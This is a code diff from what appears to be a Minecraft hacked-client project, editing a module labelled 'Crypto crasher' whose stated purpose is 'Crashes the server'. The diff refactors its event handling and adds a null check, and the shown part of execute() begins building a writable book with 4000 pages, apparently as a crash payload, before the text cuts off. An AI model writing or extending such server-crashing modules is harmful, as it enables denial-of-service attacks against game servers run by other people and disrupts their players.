@@ -10,9 +10,10 @@ import su.mandora.tarasande.system.base.valuesystem.impl.ValueBoolean
 import su.mandora.tarasande.system.base.valuesystem.impl.ValueNumber
 import su.mandora.tarasande.system.feature.modulesystem.Module
 import su.mandora.tarasande.util.math.TimeUtil
+import su.mandora.tarasande_crasher.CRASHER
 import java.util.*
 
-class ModuleCryptoCrasher : Module("Crypto crasher", "Crashes the server", "Crasher") {
+class ModuleCryptoCrasher : Module("Crypto crasher", "Crashes the server", CRASHER) {
 
     private val repeat = ValueBoolean(this, "Repeat", false)
     private val repeatDelay = ValueNumber(this, "Repeat delay", 500.0, 1000.0, 50000.0, 500.0, isEnabled = { repeat.value })
@@ -23,22 +24,26 @@ class ModuleCryptoCrasher : Module("Crypto crasher", "Crashes the server", "Cras
         registerEvent(EventDisconnect::class.java) {
             switchState()
         }
-        registerEvent(EventUpdate::class.java) {
-            if (repeat.value) {
-                if (timer.hasReached(repeatDelay.value.toLong())) {
-                    execute()
-                    timer.reset()
+        registerEvent(EventUpdate::class.java) { event ->
+            if(event.state == EventUpdate.State.PRE) {
+                if (repeat.value) {
+                    if (timer.hasReached(repeatDelay.value.toLong())) {
+                        execute()
+                        timer.reset()
+                    }
                 }
             }
         }
     }
 
     override fun onEnable() {
-        super.onEnable()
         if (!repeat.value) execute()
     }
 
     private fun execute() {
+        if(mc.player == null)
+            return
+
         ItemStack(Items.WRITABLE_BOOK).apply {
             val pages = ArrayList<String>()
             repeat(4000) { pages.add("a") }
